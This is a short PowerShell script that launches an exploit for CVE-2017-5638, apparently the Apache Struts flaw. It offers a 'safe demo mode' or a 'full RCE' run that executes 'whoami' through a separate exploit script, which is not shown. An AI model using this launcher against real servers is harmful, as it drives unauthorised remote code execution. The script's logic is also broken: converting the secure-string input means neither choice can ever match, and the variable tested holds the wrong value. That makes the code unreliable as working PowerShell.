$s = Read-Host "Enter 0 to run the exploit in safe demo mode, or 1 for full RCE" -AsSecureString | ConvertFrom-SecureString | ForEach-Object {
	switch ($_ -replace '"', '') {
		'0' { "Running in safe demo mode...`n" }
		'1' { "Running with full RCE...`n" }
		default { throw "Invalid choice. Please enter 0 or 1." }
	}
}
if ($s -eq '0') {
    # Safe demo (proves OGNL eval, no OS commands):
    .\exploit_cve_2017_5638.ps1 -DemoMode
} elseif ($s -eq '1') {
    # Full RCE:
    .\exploit_cve_2017_5638.ps1 -Command "whoami"
}
Read-Host "Press Enter to exit..."